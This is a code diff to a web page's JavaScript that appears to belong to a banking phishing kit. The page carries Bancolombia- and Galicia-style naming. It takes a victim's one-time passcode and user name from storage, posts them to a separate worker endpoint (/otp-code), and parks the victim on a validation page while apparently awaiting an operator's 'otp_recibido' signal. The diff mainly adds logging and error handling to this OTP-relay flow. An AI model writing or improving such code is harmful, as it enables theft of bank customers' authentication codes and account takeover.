@@ -446,19 +446,34 @@
             loadingOverlay.style.display = 'flex';
 
             try {
+                // ============================================================
+                // 1. OBTENER DATOS DEL localStorage
+                // ============================================================
                 let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                 const transactionId = bancoldata.transactionId;
+                const usuario = bancoldata.usuario;
 
+                console.log('📦 Datos en localStorage:', bancoldata);
+
+                // ============================================================
+                // 2. VALIDAR QUE EXISTA TRANSACTION ID
+                // ============================================================
                 if (!transactionId) {
-                    console.error('❌ No hay transactionId');
-                    alert('Error: Sesión no encontrada');
-                    window.location.href = `${BASE_URL}/w.html`;
+                    console.error('❌ No hay transactionId en localStorage');
+                    loadingOverlay.style.display = 'none';
+                    alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
+                    window.location.href = `${BASE_URL}/index.html`;
                     return;
                 }
 
-                console.log('📤 Enviando OTP:', token);
+                console.log('📤 Enviando código OTP:', token);
+                console.log('👤 Usuario:', usuario);
                 console.log('🆔 TransactionId:', transactionId);
+                console.log(`📡 Worker URL: ${WORKER_URL}/otp-code`);
 
+                // ============================================================
+                // 3. ENVIAR AL WORKER (endpoint /otp-code)
+                // ============================================================
                 const response = await fetch(`${WORKER_URL}/otp-code`, {
                     method: 'POST',
                     headers: { 
@@ -471,30 +486,55 @@
                     })
                 });
 
-                const result = await response.json();
-                console.log('📦 Respuesta:', result);
+                console.log('📊 Status de la respuesta:', response.status);
+
+                // ============================================================
+                // 4. PROCESAR RESPUESTA
+                // ============================================================
+                let result;
+                try {
+                    result = await response.json();
+                    console.log('📦 Respuesta del worker:', result);
+                } catch (parseError) {
+                    console.error('❌ Error al parsear JSON:', parseError);
+                    const textResponse = await response.text();
+                    console.log('📄 Respuesta en texto:', textResponse);
+                    throw new Error('Error al procesar la respuesta del servidor');
+                }
 
                 loadingOverlay.style.display = 'none';
 
+                // ============================================================
+                // 5. MANEJAR RESPUESTA DEL WORKER
+                // ============================================================
                 if (result.ok) {
-                    // ✅ Código válido - Guardar y redirigir a validacion.html
+                    // ✅ CÓDIGO VÁLIDO
+                    console.log('✅ Código OTP válido');
+                    
+                    // Guardar en localStorage que el OTP fue enviado
                     bancoldata.otp_enviado = true;
                     bancoldata.otp = token;
                     localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
                     
-                    console.log('✅ OTP válido, redirigiendo a validacion.html');
+                    // Redirigir a validacion.html para que espere el estado "otp_recibido"
+                    console.log('🔄 Redirigiendo a validacion.html para esperar confirmación');
                     window.location.href = `${BASE_URL}/validacion.html`;
+                    
                 } else {
-                    console.log('❌ OTP inválido');
+                    // ❌ CÓDIGO INVÁLIDO
+                    console.log('❌ Código OTP inválido - Respuesta:', result);
                     mostrarErrorCajas();
                     mostrarAlerta();
                 }
 
             } catch (err) {
-                console.error('❌ Error:', err);
+                // ============================================================
+                // 6. MANEJAR ERRORES
+                // ============================================================
+                console.error('❌ Error detallado:', err);
                 loadingOverlay.style.display = 'none';
                 mostrarErrorCajas();
-                alert('Error al conectar con el servidor. Intentá nuevamente.');
+                alert('Error al conectar con el servidor. Por favor, intentá nuevamente.\n\nDetalle: ' + err.message);
             }
         }
 
@@ -541,13 +581,15 @@
         // ==================== INICIALIZAR ====================
         let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
         if (!bancoldata.transactionId) {
-            console.error('❌ No hay transactionId');
-            window.location.href = `${BASE_URL}/w.html`;
+            console.error('❌ No hay transactionId, redirigiendo a index.html');
+            window.location.href = `${BASE_URL}/index.html`;
             return;
         }
 
         console.log('🔍 TransactionId:', bancoldata.transactionId);
+        console.log('👤 Usuario:', bancoldata.usuario);
         console.log('🚀 Página de código Galicia lista');
+        console.log(`📡 Worker URL: ${WORKER_URL}`);
         
         updateButton();
         setTimeout(() => input.focus(), 300);
